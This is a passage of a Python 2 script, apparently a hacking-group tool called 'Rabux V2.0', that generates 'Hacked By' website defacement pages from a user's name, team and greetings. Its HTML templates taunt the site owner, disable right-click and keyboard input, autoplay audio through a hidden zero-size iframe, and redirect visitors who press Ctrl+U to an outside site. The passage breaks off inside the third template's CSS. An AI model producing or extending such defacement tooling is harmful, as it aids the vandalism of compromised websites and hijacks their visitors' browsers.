# Rabux V2.0
# Create begin 13-7-18 (10.21) 
# Create End 	17-7-18 (16.34)
# Coded by : ZetSec

# -*- coding: utf-8 -*-
# coding: utf-8
import os
import sys
from time import sleep

if sys.platform == "linux2":
	os.system("clear")
elif sys.platform == "win32":
	os.system("cls")
else:
	os.system("clear")
	
	
# Script Oneth
def script1():
	try:
		script = open("script1.html"  , 'w')
	except(IOError):
		print "Error when create script1.html"
		print "Is back to the menu.."
		sleep(0.5)
		show_menu()
		
	print "Script Design Oneth"
	print 
	name = raw_input("Enter your name: ")
	team = raw_input("Enter your team name: ")
	greetz = raw_input("Greetz to: ")
	sleep(1)
	print " ~ Succes "
	print " ~ Script save as script1.html"
	sleep(1.5)
    
	script.write("""

      
<head><meta http-equiv="Content-Language" content="en-us"> 
       
       
<meta content="HACKED" name="description"/>
<meta content="HACKED" name="keywords"/>
<meta content="HACKED" name="Abstract"/>
<meta name="HACKED"/> 

    
       
<link rel="icon" href="hackerraun.jpg"> 
       
<title>Hacked By """+name+"""</title> 

       
        
        
<style type="text/css">
       
h1 {color: #333;font-size: 100px;margin: 1px auto;text-align:center; font-family:Orbitron;}
.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
h2 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Audiowide;}
.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
h3 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Audiowide;}
.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
.matrix {color: #FFFFFF; font-family:Arial, Courier, Monotype; font-size:10pt; text-align:center; width:10px; padding:0px; margin:0px;}
.jokitz1{
    text-align : center;
    }
.jokitz2{
	text-align : center;
	font-family : Courier;
	}
	
</style>
</head> 

        
<body bgcolor=black lang=EN-US style='tab-interval:36.0pt; text-align:center'> <onload=type_text() onclick='alert("Zuahahaha")'> 
        
        
       
<style>body{cursor:url("http://www.madleets.com/elhacker.cur"),auto;}html{display:table;height:100%;width:100%;}body{display:table-row;}body{display:table-cell;vertical-align:middle;text-align:center;}a:link{text-decoration:none;}</style>
       
        
<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Audiowide' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>

<p align="center" dir="ltr"></p>

<script type="text/javascript">

<!--  
       
var message="Sorry, right-click has been disabled":

       
function clickIE() {if (document.all) {(message);return false;}}

function clickNS(e) {if

(document.layers||(document.getElementById&&!document.all)) {

if (e.which==2||e.which==3) {(message);return false;}}}

if (document.layers)

{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}

else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}

document.oncontextmenu=new Function("return false")

 // -->

</script>

<!-- <script language="JavaScript1.2" type="text/javascript">

function ClearError() {return true;}

window.onerror = ClearError;

</script> -->  
        
        
        
<script type="text/javascript" language="javascript">



<!--

var rows=1; // must be an odd number

var speed=10; // lower is faster

var reveal=2; // between 0 and 2 only. The higher, the faster the word appears

var effectalign="center" //enter "center" to center it.



/***********************************************

* The Matrix Text Effect- by Richard Womersley (http://www.mf2fm.co.uk/rv)

* This notice must stay intact for use

* Visit http://www.dynamicdrive.com/ for full source code

***********************************************/

         
        
         
        
var w3c=document.getElementById && !window.opera;;

var ie45=document.all && !window.opera;

var ma_tab, matemp, ma_bod, ma_row, x, y, columns, ma_txt, ma_cho;

var m_coch=new Array();

var m_copo=new Array();

window.onload=function() { 
        
        
        
    if (!w3c && !ie45) return
        
  var matrix=(w3c)?document.getElementById("matrix"):document.all["matrix"];

  ma_txt=(w3c)?matrix.firstChild.nodeValue:matrix.innerHTML;

 ma_txt=" "+ma_txt+" ";

 columns=ma_txt.length;

 if (w3c) { 
        
    while (matrix.childNodes.length) matrix.removeChild(matrix.childNodes[0]);

    ma_tab=document.createElement("table");

    ma_tab.setAttribute("border", 0);

    ma_tab.setAttribute("align", effectalign);

    ma_tab.style.backgroundColor="#000000";

    ma_bod=document.createElement("tbody");

    for (x=0; x<rows; x++) { 

       
      ma_row=document.createElement("tr");

      for (y=0; y<columns; y++) { 
        
          matemp=document.createElement("td");

          matemp.setAttribute("id", "Mx"+x+"y"+y);

         matemp.className="matrix";

          matemp.appendChild(document.createTextNode(String.fromCharCode(160)));

          ma_row.appendChild(matemp);
          
        }
        ma_bod.appendChild(ma_row);

      }
      ma_tab.appendChild(ma_bod);

      matrix.appendChild(ma_tab);
         
    } else {
            
      ma_tab='<ta'+'ble align="'+effectalign+'" border="0" style="background-color:#000000">';

      for (var x=0; x<rows; x++) {
      
        ma_tab+='<t'+'r>';

        for (var y=0; y<columns; y++) {
        
        ma_tab+='<t'+'d class="matrix" id="Mx'+x+'y'+y+'"> </'+'td>';
      }
      
      ma_tab+='</'+'tr>';
      
    }
    
    ma_tab+='</'+'table>';
    
    matrix.innerHTML=ma_tab;
  }
  
  ma_cho=ma_txt;

  for (x=0; x<columns; x++) {
  
    ma_cho+=String.fromCharCode(32+Math.floor(Math.random()*94));

    m_copo[x]=0;
  }
  
  ma_bod=setInterval("mytricks()", speed);
}


function mytricks() {

  x=0;

  for (y=0; y<columns; y++) {
  
    x=x+(m_copo[y]==100);

    ma_row=m_copo[y]%100;

    if (ma_row && m_copo[y]<100) {
    
      if (ma_row<rows+1) {
      
        if (w3c) {
        
          matemp=document.getElementById("Mx"+(ma_row-1)+"y"+y);

          matemp.firstChild.nodeValue=m_coch[y];
        }
        
        else {
        
          matemp=document.all["Mx"+(ma_row-1)+"y"+y];

          matemp.innerHTML=m_coch[y];
          
        }
        
        matemp.style.color="#81F2FF";

        matemp.style.fontWeight="bold";
        
      }
      
      if (ma_row>1 && ma_row<rows+2) {
      
        matemp=(w3c)?document.getElementById("Mx"+(ma_row-2)+"y"+y):document.all["Mx"+(ma_row-2)+"y"+y];

        matemp.style.fontWeight="normal";

        matemp.style.color="#00BBFF";
      }
      
      if (ma_row>2) {

        matemp=(w3c)?document.getElementById("Mx"+(ma_row-3)+"y"+y):document.all["Mx"+(ma_row-3)+"y"+y];

        matemp.style.color="#20FFDA";
      }
              
      if (ma_row<Math.floor(rows/2)+1) m_copo[y]++;

      else if (ma_row==Math.floor(rows/2)+1 && m_coch[y]==ma_txt.charAt(y)) zoomer(y);

      else if (ma_row<rows+2) m_copo[y]++;

      else if (m_copo[y]<100) m_copo[y]=0;
    }
            
    else if (Math.random()>0.9 && m_copo[y]<100) {
        m_coch[y]=ma_cho.charAt(Math.floor(Math.random()*ma_cho.length));

        m_copo[y]++;
        
      }
    }
          
    if (x==columns) clearInterval(ma_bod);
    
}

function zoomer(ycol) {

  var mtmp, mtem, ytmp;

  if (m_copo[ycol]==Math.floor(rows/2)+1) {
  
    for (ytmp=0; ytmp<rows; ytmp++) {
              
      if (w3c) {
                
        mtmp=document.getElementById("Mx"+ytmp+"y"+ycol);

        mtmp.firstChild.nodeValue=m_coch[ycol];
      }
      
      else {
        mtmp=document.all["Mx"+ytmp+"y"+ycol];

        mtmp.innerHTML=m_coch[ycol];
      }
              
      mtmp.style.color="#5BEEFF";

      mtmp.style.fontWeight="bold";
      
    }
            
    if (Math.random()<reveal) {
      mtmp=ma_cho.indexOf(ma_txt.charAt(ycol));

      ma_cho=ma_cho.substring(0, mtmp)+ma_cho.substring(mtmp+1, ma_cho.length);
                
    }
              
    if (Math.random()<reveal-1) ma_cho=ma_cho.substring(0, ma_cho.length-1);

    m_copo[ycol]+=199;

    setTimeout("zoomer("+ycol+")", speed);
              
  }
  
  else if (m_copo[ycol]>200) {
              
    if (w3c) {
    
      mtmp=document.getElementById("Mx"+(m_copo[ycol]-201)+"y"+ycol);

      mtem=document.getElementById("Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol);
    }
    
    else {
                  
      mtmp=document.all["Mx"+(m_copo[ycol]-201)+"y"+ycol];

      mtem=document.all["Mx"+(200+rows-m_copo[ycol]--)+"y"+ycol];
    }
    mtmp.style.fontWeight="normal";

    mtem.style.fontWeight="normal";

    setTimeout("zoomer("+ycol+")", speed);
  }
  else if (m_copo[ycol]==200) m_copo[ycol]=100+Math.floor(rows/2);

  if (m_copo[ycol]>100 && m_copo[ycol]<200) {
                  
    if (w3c) {
                      
      mtmp=document.getElementById("Mx"+(m_copo[ycol]-101)+"y"+ycol);

      mtmp.firstChild.nodeValue=String.fromCharCode(160);

      mtem=document.getElementById("Mx"+(100+rows-m_copo[ycol]--)+"y"+ycol);

      mtem.firstChild.nodeValue=String.fromCharCode(160);
    }
    
    else {
                      
      mtmp=document.all["Mx"+(m_copo[ycol]-101)+"y"+ycol];

      mtmp.innerHTML=String.fromCharCode(160);

      mtem=document.all["Mx"+(100+rows-m_copo[ycol]--)+"y"+ycol];

      mtem.innerHTML=String.fromCharCode(160);
                      
    }
                     
   setTimeout("zoomer("+ycol+")", speed);
                     
 } 
 
       
        
       
var h1 = document.getElementsByTagName("h1")[0],

text = h1.innerText || h1.textContent,

split = [], i, lit = 0, timer = null;

for(i = 0; i < text.length; ++i) {

split.push("<span>" + text[i] + "</span>");

}

h1.innerHTML = split.join("");

split = h1.childNodes;



var flicker = function() {

lit += 0.01;

if(lit >= 1) {

clearInterval(timer);

}


for(i = 0; i < split.length; ++i) {

if(Math.random() < lit) {

split[i].className = "neon";


} else {

split[i].className = "";

}

}

}

setInterval(flicker, 100);



}

//strat sec 



// end  -->

</script> 
        
        
        
        
<body style="color: #FFFFFF; background-color: #000000">

<img src="https://scontent.fsub5-1.fna.fbcdn.net/v/t1.0-1/p160x160/18700043_261442954329212_6270640292972818895_n.jpg?oh=674e5b3fab52074398d9e4532ffd6b63&oe=59D9D762"></center><br>

<center><img src="http://www6.0zz0.com/2011/03/14/06/269205957.gif"></center><br> 
        
        
        
       
<h1> ..:: """+name+""" ::..</h1>
        
        
<h3>"""+team+"""</h3>
        
       
        
     

<center><img src="http://www6.0zz0.com/2011/03/14/06/269205957.gif"></center><br>

<center><div style="width:250px;height:50px;border:6px ridge orange;"> 
        
<font face="Iceland" style="color:#00FFFF;text-shadow:0px 1px 5px #000;font-size:20px">YOUR FACE STATUS:</font>
<font face="Iceland" style="color:Red;text-shadow:0px 1px 5px #000;font-size:20px">LULZ !</font><br>
<font face="Iceland" style="color:#00FFFF;text-shadow:0px 1px 5px #000;font-size:20px">YOUR SITE STATUS:</font>
<font face="Iceland" style="color:Red;text-shadow:0px 1px 5px #000;font-size:20px">LOSE !</font><br></div></center><br>


       
  
<font face="Iceland" style="color:#00FCFF;text-shadow:0px 1px 5px #000;font-size:50px"><br>
<div id="matrix" class="auto-style8" font-size="100px"> Greetz To :"""+greetz+""" </div></font><br>

</body>
</html> """)

# Script Second
def script2():
	try:
		script = open("script2.html" ,'w')
	except(IOError):
		print "Error when creating file"
		print "Is back to the menu.."
		sleep(0.5)
		show_menu()

	print "Script Design Second"
	print 
	name_style = raw_input("Enter your name: ")
	message = raw_input("Enter your message: ")
	picture_style = raw_input("Enter your picture: ")
	sleep(0.5)
	print " ~ Success "
	print " ~ Script is save as script2.html"
	sleep(1.5)
	
		
	script.write("""
<html>   
    <head>
        <title>Hacked By """+name_style+"""</title>
		<link href="http://fonts.googleapis.com/css?family=Orbitron" rel="stylesheet" type="text/css" />

		<script>alert("Got Hacked?");</script>
		<style type="text/css"> """)
	script.write('\n')
		
	script.write("""
#container {
  width:97vw;
  margin:2vw auto;
}
font{
  font-familly:Orbitron;
  text-align:center;
  letter-spacing:1px;
  color:white;
  /*Create overlap*/
  
  margin:0;
  line-height:0;
  /*Animation*/
  
  -webkit-animation: glitch1 2.5s infinite;
  
          animation: glitch1 2.5s infinite;
}
font:nth-child(2) {
  color: #67f3da;
  -webkit-animation: glitch2 2.5s infinite;
          animation: glitch2 2.5s infinite;
}
font:nth-child(3) {
  color: #f16f6f;
  -webkit-animation: glitch3 2.5s infinite;
          animation: glitch3 2.5s infinite;
}
/*Keyframes*/
@-webkit-keyframes glitch1 {
  0% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  7% {
    -webkit-transform: skew(-0.5deg, -0.9deg);
            transform: skew(-0.5deg, -0.9deg);
    opacity: 0.75;
  }
  10% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  27% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  30% {
    -webkit-transform: skew(0.8deg, -0.1deg);
            transform: skew(0.8deg, -0.1deg);
    opacity: 0.75;
  }
  35% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  52% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  55% {
    -webkit-transform: skew(-1deg, 0.2deg);
            transform: skew(-1deg, 0.2deg);
    opacity: 0.75;
  }
  50% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  72% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  75% {
    -webkit-transform: skew(0.4deg, 1deg);
            transform: skew(0.4deg, 1deg);
    opacity: 0.75;
  }
  80% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  100% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
}
@keyframes glitch1 {
  0% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  7% {
    -webkit-transform: skew(-0.5deg, -0.9deg);
            transform: skew(-0.5deg, -0.9deg);
    opacity: 0.75;
  }
  10% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  27% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  30% {
    -webkit-transform: skew(0.8deg, -0.1deg);
            transform: skew(0.8deg, -0.1deg);
    opacity: 0.75;
  }
  35% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  52% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  55% {
    -webkit-transform: skew(-1deg, 0.2deg);
            transform: skew(-1deg, 0.2deg);
    opacity: 0.75;
  }
  50% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  72% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  75% {
    -webkit-transform: skew(0.4deg, 1deg);
            transform: skew(0.4deg, 1deg);
    opacity: 0.75;
  }
  80% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
  100% {
    -webkit-transform: none;
            transform: none;
    opacity: 1;
  }
}
@-webkit-keyframes glitch2 {
  0% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  7% {
    -webkit-transform: translate(-2px, -3px);
            transform: translate(-2px, -3px);
    opacity: 0.5;
  }
  10% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  27% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  30% {
    -webkit-transform: translate(-5px, -2px);
            transform: translate(-5px, -2px);
    opacity: 0.5;
  }
  35% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  52% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  55% {
    -webkit-transform: translate(-5px, -1px);
            transform: translate(-5px, -1px);
    opacity: 0.5;
  }
  50% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  72% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  75% {
    -webkit-transform: translate(-2px, -6px);
            transform: translate(-2px, -6px);
    opacity: 0.5;
  }
  80% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  100% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
}
@keyframes glitch2 {
  0% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  7% {
    -webkit-transform: translate(-2px, -3px);
            transform: translate(-2px, -3px);
    opacity: 0.5;
  }
  10% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  27% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  30% {
    -webkit-transform: translate(-5px, -2px);
            transform: translate(-5px, -2px);
    opacity: 0.5;
  }
  35% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  52% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  55% {
    -webkit-transform: translate(-5px, -1px);
            transform: translate(-5px, -1px);
    opacity: 0.5;
  }
  50% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  72% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  75% {
    -webkit-transform: translate(-2px, -6px);
            transform: translate(-2px, -6px);
    opacity: 0.5;
  }
  80% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  100% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
}
mm
@-webkit-keyframes glitch3 {
  0% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  7% {
    -webkit-transform: translate(2px, 3px);
            transform: translate(2px, 3px);
    opacity: 0.5;
  }
  10% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  27% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  30% {
    -webkit-transform: translate(5px, 2px);
            transform: translate(5px, 2px);
    opacity: 0.5;
  }
  35% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  52% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  55% {
    -webkit-transform: translate(5px, 1px);
            transform: translate(5px, 1px);
    opacity: 0.5;
  }
  50% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  72% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  75% {
    -webkit-transform: translate(2px, 6px);
            transform: translate(2px, 6px);
    opacity: 0.5;
  }
  80% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  100% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
}
@keyframes glitch3 {
  0% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  7% {
    -webkit-transform: translate(2px, 3px);
            transform: translate(2px, 3px);
    opacity: 0.5;
  }
  10% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  27% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  30% {
    -webkit-transform: translate(5px, 2px);
            transform: translate(5px, 2px);
    opacity: 0.5;
  }
  35% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  52% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  55% {
    -webkit-transform: translate(5px, 1px);
            transform: translate(5px, 1px);
    opacity: 0.5;
  }
  50% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  72% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  75% {
    -webkit-transform: translate(2px, 6px);
            transform: translate(2px, 6px);
    opacity: 0.5;
  }
  80% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
  100% {
    -webkit-transform: none;
            transform: none;
    opacity: 0.25;
  }
}
		</style>
	</head>
	</head>
	<body bgcolor="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" ondragstart="return false" onselectstart="return false">
		<iframe width="0" height="0" scrolling="yes" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/403414851&amp;auto_play=true&amp;hide_related=false&amp;show_comments=false&amp;show_user=true&amp;show_reposts=false&amp;visual=false"></iframe>
		<center>
			<br />

			<br />

			<br />

			<br />

			<br />
			<div id="container">
			    <img src=" """+picture_style+""" " title="Hacked" />
			    <br />

				<br />

				<font face="Orbitron" size="7">Hacked By """+name_style+"""</font>
				<br />

				<br />

				<br />

				<font face="Orbitron" size="5">"""+message+"""</font>
			</div>
		</center>
		<script type="text/javascript">
var snowmax=30
var snowcolor=new Array("white","yellow","red","aqua")
var snowtype=new Array("Arial Narrow","Times","Comic Sans MS")
var snowletter="."
var sinkspeed=0.6
var snowmaxsize=30
var snowminsize=10
var snowingzone=1
var snow=new Array()
var marginbottom
var marginright
var timer
var i_snow=0
var x_mv=new Array();
var crds=new Array();
var lftrght=new Array();
var browserinfos=navigator.userAgent 
var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
var ns6=document.getElementById&&!document.all
var opera=browserinfos.match(/Opera/)  
var browserok=ie5||ns6||opera
function randommaker(range) {  
 rand=Math.floor(range*Math.random())
    return rand
}
function initsnow() {
 if (ie5 || opera) {
  marginbottom = document.body.clientHeight
  marginright = document.body.clientWidth
 }
 else if (ns6) {
  marginbottom = window.innerHeight
  marginright = window.innerWidth
 }
 var snowsizerange=snowmaxsize-snowminsize
 for (i=0;i<=snowmax;i++) {
  crds[i] = 0;                      
     lftrght[i] = Math.random()*15;         
     x_mv[i] = 0.03 + Math.random()/10;
  snow[i]=document.getElementById("s"+i)
  snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
  snow[i].size=randommaker(snowsizerange)+snowminsize
  snow[i].style.fontSize=snow[i].size
  snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
  snow[i].sink=sinkspeed*snow[i].size/5
  if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
  if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
  if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
  if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
  snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
  snow[i].style.left=snow[i].posx
  snow[i].style.top=snow[i].posy
 }
 movesnow()
}
function movesnow() {
 for (i=0;i<=snowmax;i++) {
  crds[i] += x_mv[i];
  snow[i].posy+=snow[i].sink
  snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
  snow[i].style.top=snow[i].posy 
  if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
   if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
   if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
   if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
   if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
   snow[i].posy=0
  }
 }
 var timer=setTimeout("movesnow()",50)
}
for (i=0;i<=snowmax;i++) {
 document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
}
if (browserok) {
 window.onload=initsnow
}
		</script>
		<script type="text/javascript">
//<![CDATA[
shortcut={all_shortcuts:{},add:function(a,b,c){var
d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var
e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else
c=d;d=c.target,"string"==typeof
c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var
e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var
f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var
s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return
d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var
a=a.toLowerCase(),b=this.all_shortcuts[a];delete
this.all_shortcuts[a];if(b){var
a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="http://www.shafou.com"});
//]]>  
		</script>
	</body>
</html> """)

# def script design Third
def script3():
	try:
		script = open("script3.html",'w')
	except(IOError):
		print "Error when creating script3.html"
		print "Is back to the menu.."
		sleep(0.5)
		show_menu()
	
	# script3.html
	
	print "Script Design Third"
	print 
	name_style = raw_input("Enter your name: ")
	team_style = raw_input("Enter your team name: ")
	greetz_style = raw_input("Greetz to: ")
	sleep(1)
	print " ~ Success"
	print " ~ Script save as script3.html"
	sleep(1.5)
		
	script.write("""
<html>
<head>
<title>"""+name_style+"""</title>
	<style>

@import url(http://fonts.googleapis.com/css?family=Gilda+Display);

html {
  background-color:black;
  color: white;
  overflow: hidden;
  height: 100%;
  -webkit-user-select: none;
     -moz-user-select: none;
      -ms-user-select: none;
          user-select: none;
		  font-size: medium;
}

.error {
  text-align: center;
  font-family: 'Gilda Display', serif;
  
  text-align: center;
  width: 100%;
  height: 120px;
  margin: auto;
  position: absolute;
  top: 0;
  bottom: 0;
  left: -60px;
  right: 0;
  -webkit-animation: noise-3 1s linear infinite;
          animation: noise-3 1s linear infinite;
  overflow: default;
}

body:after {
  content:' """ +name_style+""" ';
  font-family: OCR-A;
  font-size: 70px;
  
  text-align: center;
  width: 550px;
  margin: auto;
  position: absolute;
  top: 25%;
  bottom: 0;
  left: 0;
  right: 35%;
  opacity: 0;
  color: red;
  -webkit-animation: noise-1 .2s linear infinite;
          animation: noise-1 .2s linear infinite;
}
body:before {
  content: ' """+name_style+""" ';
  font-family: OCR-A;
  font-size: 75px;
  
  text-align: center;
  width: 550px;
  margin: auto;
  position: absolute;
  top: 25%;
  bottom: 0;
  left: 0;
  right: 35%;
  opacity: 0;
  color: green;
  -webkit-animation: noise-2 .2s linear infinite;
          animation: noise-2 .2s linear infinite;
}

.info {
  text-align: center;
  width: 200px;
  height: 60px;
  margin: auto;
  position: absolute;
  top: 280px;
  bottom: 0;
  left: 20px;
  right: 0;
  -webkit-animation: noise-3 1s linear infinite;
          animation: noise-3 1s linear infinite;
}

.info:before {
  content: ' """+team_style+""" ';
  font-family: OCR-A;
  font-size: 50px;
  text-align: center;
  width: 800px; 
  margin: auto;
  position: absolute;
  top: 20px;
  bottom: 0;
  left: 40px;
  right: 100px;
  opacity: 0;
  color: red;
  -webkit-animation: noise-2 .2s linear infinite;
          animation: noise-2 .2s linear infinite;
}

.info:after {
  content: ' """+team_style+""" ';
  font-family: OCR-A;
  font-size: 50px;
  text-align: center;
  width: 800px;
  margin: auto;
  position: absolute;
  top: 20px;
  bottom: 0;
  left: 40px;
  right: 0;
  opacity: 0;
  color: blue;
  -webkit-animation: noise-1 .2s linear infinite;
          animation: noise-1 .2s linear infinite;
}

@-webkit-keyframes noise-1 {
  0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;}
  10% {opacity: .1;}
  50% {opacity: .5; left: -6px;}
  80% {opacity: .3;}
  100% {opacity: .6; left: 2px;}
}

@keyframes noise-1 {
  0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;}
  10% {opacity: .1;}
  50% {opacity: .5; left: -6px;}
  80% {opacity: .3;}
  100% {opacity: .6; left: 2px;}
}

@-webkit-keyframes noise-2 {
  0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;}
  10% {opacity: .1;}
  50% {opacity: .5; left: 6px;}
  80% {opacity: .3;}
  100% {opacity: .6; left: -2px;}
}

@keyframes noise-2 {
  0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;}
  10% {opacity: .1;}
  50% {opacity: .5; left: 6px;}
  80% {opacity: .3;}
  100% {opacity: .6; left: -2px;}
}

@-webkit-keyframes noise {
  0%, 3%, 5%, 42%, 44%, 100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);}  
  4.3% {opacity: 1; -webkit-transform: scaleY(1.7); transform: scaleY(1.7);}
  43% {opacity: 1; -webkit-transform: scaleX(1.5); transform: scaleX(1.5);}
}

@keyframes noise {
  0%, 3%, 5%, 42%, 44%, 100% {opacity: 1; -webkit-transform: scaleY(1); transform: scaleY(1);}  
